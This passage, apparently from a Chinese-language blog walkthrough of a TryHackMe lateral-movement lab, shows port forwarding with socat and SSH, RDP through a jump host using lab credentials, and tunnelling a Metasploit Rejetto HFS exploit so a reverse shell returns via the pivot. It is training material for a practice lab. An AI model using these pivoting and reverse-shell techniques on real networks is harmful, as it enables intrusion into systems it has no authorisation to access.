<p>请注意，某些软件（例如 nmap）在某些情况下可能无法与 SOCKS 很好地配合，并且可能显示不同的结果，因此您的情况可能会有所不同。</p>
<h2 id="实践练习-5"><a href="#实践练习-5" class="headerlink" title="实践练习-5"></a>实践练习</h2>
<p>注意：由于您将使用 <code>tunneluser</code> 执行从实验室网络到攻击者计算机的 SSH 连接，因此我们强烈建议您使用 Attackbox 或虚拟机，而不是您的实际计算机。已给出有关创建不允许通过 SSH/SCP 运行命令或传输文件的用户的说明，因此请务必按照提供的说明进行操作。还建议为 <code>tunneluser</code> 创建一个强密码，并确保它是唯一且可丢弃的密码，而不是您在此或任何其他平台中的实际密码。</p>
<p>要完成此练习，您需要使用在任务 1 中从 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.com/creds">http://distributor.za.tryhackme.com/creds</a> 分配给您的凭据连接到 THMJMP2。如果您还没有这样做，请单击链接并立即获取凭据。获得凭据后，通过 SSH 连接到 THMJMP2：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh za\\tony<span class="hljs-selector-class">.holland</span><span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com<br>    //密码为：Mhvn2334<br></code></pre></td></tr></table></figure>
<p>我们的第一个目标是通过 RDP 连接到 THMIIS。如果我们尝试直接从攻击者计算机进行连接，我们会发现端口 3389 已通过防火墙过滤，因此无法直接使用。但是，该端口已启动并正在运行，但只能从 THMJMP2 访问。通过使用 THMJMP2 上 <code>C:\tools\socat\</code> 上提供的 socat，我们将转发 RDP 端口，使其在 THMJMP2 上可用于从攻击者的计算机进行连接。</p>
<p>为此，我们将使用以下参数运行 socat：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\tools\socat\&gt;socat TCP4-LISTEN:<span class="hljs-number">3697</span>,fork TCP4:THMIIS.za.tryhackme.com:<span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
<p>请注意，我们不能将端口 3389 用于侦听器，因为它已在 THMJMP2 中用于其自己的 RDP 服务。请随意将侦听器端口 (13389) 更改为其他号码，以避免与其他学生发生冲突。在典型设置中，您必须添加防火墙规则以允许流量通过侦听器端口，但为了方便起见，THMJMP2 已禁用其防火墙。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205715457.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205715457.png" alt="image-20240216205715457"></p>
<p>设置侦听器后，您应该能够通过 THMJMP2 处的 socat 侦听器通过 RDP 从攻击者计算机连接到 THMIIS：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@AttackBox</span>$ xfreerdp /<span class="hljs-attribute">v</span>:THMJMP2.za.tryhackme.<span class="hljs-attribute">com</span>:<span class="hljs-number">3697</span> /<span class="hljs-attribute">u</span>:t1_thomas.moore /<span class="hljs-attribute">p</span>:MyPazzw3rd2020<br></code></pre></td></tr></table></figure>
<p>连接后，您应该会从 THMIIS 上的 t1_thomas.moore 桌面上获得一个标志。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205818932.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205818932.png" alt="image-20240216205818932"></p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205806238.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205806238.png" alt="image-20240216205806238"></p>
<h3 id="隧道复杂漏洞"><a href="#隧道复杂漏洞" class="headerlink" title="隧道复杂漏洞"></a>隧道复杂漏洞</h3>
<p>THMDC 服务器正在运行 Rejetto HFS 的易受攻击版本。我们面临的问题是防火墙规则限制对易受攻击的端口的访问，因此只能从 THMJMP2 进行查看。此外，来自 THMDC 的出站连接仅允许其本地网络中的计算机进行，因此无法直接接收到攻击者计算机的反向 shell。更糟糕的是，Rejetto HFS 漏洞要求攻击者托管 HTTP 服务器来触发最终有效负载，但由于攻击者的计算机不允许出站连接，因此我们需要找到一种方法来托管 Web 服务器之一同一网络中的其他机器，这一点也不方便。我们可以使用端口转发来克服所有这些问题。</p>
<p>首先，让我们看看该漏洞利用程序是如何工作的。首先，它将连接到 HFS 端口（Metasploit 中的 <code>RPORT</code> ）以触发第二个连接。第二个连接将在 <code>SRVPORT</code> 上针对攻击者的计算机进行，其中 Web 服务器将传递最终的有效负载。最后，攻击者的有效负载将在 <code>LPORT</code> 上执行并向攻击者发送回反向 shell：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205954150.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216205954150.png" alt="image-20240216205954150"></p>
<p>考虑到这一点，我们可以使用 SSH 将某些端口从攻击者的计算机转发到 THMJMP2（用于 Web 服务器的 SRVPORT 和用于接收反向 shell 的 LPORT），并通过 THMJMP2 到达 THMDC 上的 RPORT。我们需要在两个方向上进行三个端口转发，以便所有漏洞利用的交互都可以通过 THMJMP2 进行代理：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210148593.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210148593.png" alt="image-20240216210148593"></p>
<p>Rejetto HFS 将侦听 THMDC 上的端口 80，因此我们需要使用远程端口转发通过 THMJMP2 将该端口隧道传回攻击者的计算机。由于攻击盒的 80 端口已被其他服务占用，因此我们需要将 THMDC 上的端口 80 与攻击盒当前未使用的某个端口链接起来。让我们使用端口 8888。在 THMJMP2 中运行 ssh 来转发此端口时，我们必须将 <code>-R 8888:thmdc.za.tryhackme.com:80</code> 添加到我们的命令中。</p>
<p>对于SRVPORT和LPORT，我们随意选择两个随机端口。出于演示目的，我们将设置 <code>SRVPORT=6666</code> 和 <code>LPORT=7878</code> ，但请务必使用不同的端口，因为实验室与其他学生共享，因此如果你们两个选择相同的端口，当尝试转发它们时，您会收到一条错误消息，指出此类端口已在 THMJMP2 上使用。</p>
<p>要将此类端口从攻击者计算机转发到 THMJMP2，我们将通过在 ssh 命令中添加 <code>-L *:6666:127.0.0.1:6666</code> 和 <code>-L *:7878:127.0.0.1:7878</code> 来使用本地端口转发。这将绑定 THMJMP2 上的两个端口，并将任何连接隧道返回到我们的攻击者计算机。</p>
<p>将整个命令放在一起，我们最终会得到以下结果：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">10.50</span>.<span class="hljs-number">46.236</span> -R <span class="hljs-number">8888</span>:thmdc.za.tryhackme.com:<span class="hljs-number">80</span> -L *:<span class="hljs-number">6666</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span> -L *:<span class="hljs-number">7878</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7878</span> -N<br></code></pre></td></tr></table></figure>
<p>注意：如果您使用 AttackBox 并且之前加入过其他网络房间，请务必选择分配给面向 <code>lateralmovementandpivoting</code> 网络的隧道接口的 IP 地址作为您的 ATTACKER_IP，否则您的反向 shell/连接将获胜无法正常工作。为了您的方便，连接到该网络的接口称为 <code>lateralmovement</code> ，因此您应该能够通过运行 <code>ip add show lateralmovement</code> 获得正确的 IP 地址：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210318888.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216210318888.png" alt="image-20240216210318888"></p>
<p>一旦所有端口转发到位，我们就可以启动 Metasploit 并配置漏洞利用程序，以便所需的端口与我们通过 THMJMP2 转发的端口相匹配：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/3a9b9b89b41c2382a2c8645ab1c01a2f0e640df2/images/image-20240217120311538.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/3a9b9b89b41c2382a2c8645ab1c01a2f0e640df2/images/image-20240217120311538.png" alt="images/image-20240217120311538.png  0 → 100644"></p>
<p>这里有很多东西需要解压：</p>
<ul>
<li>LHOST参数通常有两个用途：作为攻击者机器上绑定监听器的IP，用于接收反向shell；它还嵌入在有效负载中，以便受害者知道在触发漏洞时从哪里进行连接。在我们的特定场景中，由于 THMDC 无法联系到我们，因此我们需要强制有效负载连接回 THMJMP2，但我们需要侦听器在 <code>127.0.0.1</code> 上绑定到攻击者的计算机。为此，Metasploit 提供了一个可选参数 <code>ReverseListenerBindAddress</code> ，该参数可用于指定攻击者机器上侦听器的绑定地址，与负载将连接回的地址分开。在我们的示例中，我们希望将反向 shell 侦听器绑定到攻击者计算机上的 127.0.0.1，并将有效负载连接回 THMJMP2（因为它将通过 SSH 隧道转发到攻击者计算机）。</li>
<li>我们的漏洞还必须运行一个 Web 服务器来托管并将最终有效负载发送回受害者服务器。我们使用 SRVHOST 来指示监听地址，在本例中为 127.0.0.1，以便攻击者机器将 Web 服务器绑定到 localhost。虽然这可能违反直觉，因为没有外部主机能够指向攻击者的计算机本地主机，但 SSH 隧道将负责将 SRVPORT 处 THMJMP2 上收到的任何连接转发回攻击者的计算机。</li>
<li>RHOSTS 设置为指向 127.0.0.1，因为 SSH 隧道将通过使用 THMJMP2 建立的 SSH 隧道将请求转发到 THMDC。 RPORT 设置为 8888，因为发送到攻击者计算机上该端口的任何连接都将转发到 THMDC 上的端口 80。</li>
</ul>
<p>启动该漏洞后，您将在攻击者的计算机上收到一个 shell。您会在 <code>C:\hfs\flag.txt</code> 上找到一个标志。</p>
<h1>0x08 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://benheater.com/tryhackme-lateral-movement-pivoting/">TryHackMe | Lateral Movement &amp; Pivoting</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2024/02/16/THM-Nmap/">← Next THM-Nmap</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/02/14/THM-Basic_Pentesting/">THM-Basic Pentesting Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 通过网络移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%AA%E5%90%91%E8%BF%90%E5%8A%A8%EF%BC%9F"><span class="toc-number">2.1.</span> <span class="toc-text">什么是横向运动？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">一个简单的例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E8%A7%86%E8%A7%92"><span class="toc-number">2.3.</span> <span class="toc-text">攻击者的视角</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8CUAC"><span class="toc-number">2.4.</span> <span class="toc-text">管理员和UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 远程生成过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Psexec-%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text">Psexec 执行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-WinRM-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">使用 WinRM 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sc-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text">使用 sc 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.4.</span> <span class="toc-text">远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">3.5.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 使用 WMI 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-Powershell-%E8%BF%9E%E6%8E%A5%E5%88%B0-WMI"><span class="toc-number">4.1.</span> <span class="toc-text">从 Powershell 连接到 WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-WMI-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">使用 WMI 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-WMI-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.3.</span> <span class="toc-text">使用 WMI 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-WMI-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.4.</span> <span class="toc-text">使用 WMI 远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI-%E9%80%9A%E8%BF%87-WMI-%E5%AE%89%E8%A3%85-MSI-%E5%8C%85"><span class="toc-number">4.5.</span> <span class="toc-text">WMI 通过 WMI 安装 MSI 包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0-2"><span class="toc-number">4.6.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 使用替代认证材料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E8%AE%A4%E8%AF%81"><span class="toc-number">5.1.</span> <span class="toc-text">NTLM认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.</span> <span class="toc-text">传递哈希值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%9C%AC%E5%9C%B0-SAM-%E4%B8%AD%E6%8F%90%E5%8F%96-NTLM-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.1.</span> <span class="toc-text">从本地 SAM 中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E-LSASS-%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96-NTLM-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.2.</span> <span class="toc-text">从 LSASS 内存中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Linux-%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C"><span class="toc-number">5.2.3.</span> <span class="toc-text">使用 Linux 传递哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.</span> <span class="toc-text">Kerberos 身份验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%A5%A8"><span class="toc-number">5.4.</span> <span class="toc-text">传票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E8%B6%8A%E5%93%88%E5%B8%8C-%E4%BC%A0%E9%80%92%E5%AF%86%E9%92%A5"><span class="toc-number">5.5.</span> <span class="toc-text">跨越哈希&#x2F;传递密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0-3"><span class="toc-number">5.6.</span> <span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Hash"><span class="toc-number">5.6.1.</span> <span class="toc-text">Pass-the-Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Ticket"><span class="toc-number">5.6.2.</span> <span class="toc-text">Pass-the-Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Key"><span class="toc-number">5.6.3.</span> <span class="toc-text">Pass-the-Key</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 滥用用户行为</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8F%AF%E5%86%99%E8%82%A1%E4%BB%BD"><span class="toc-number">6.1.</span> <span class="toc-text">滥用可写股份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-vbs-%E8%84%9A%E6%9C%AC"><span class="toc-number">6.1.1.</span> <span class="toc-text">后门 .vbs 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe-%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">.exe 文件后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RDP%E5%8A%AB%E6%8C%81"><span class="toc-number">6.1.3.</span> <span class="toc-text">RDP劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0-4"><span class="toc-number">6.2.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E9%9A%A7%E9%81%93"><span class="toc-number">7.1.</span> <span class="toc-text">SSH 隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.2.</span> <span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.3.</span> <span class="toc-text">SSH 本地端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-socat-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.4.</span> <span class="toc-text">使用 socat 进行端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C-SOCKS"><span class="toc-number">7.5.</span> <span class="toc-text">动态端口转发和 SOCKS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0-5"><span class="toc-number">7.6.</span> <span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%A4%8D%E6%9D%82%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.</span> <span class="toc-text">隧道复杂漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>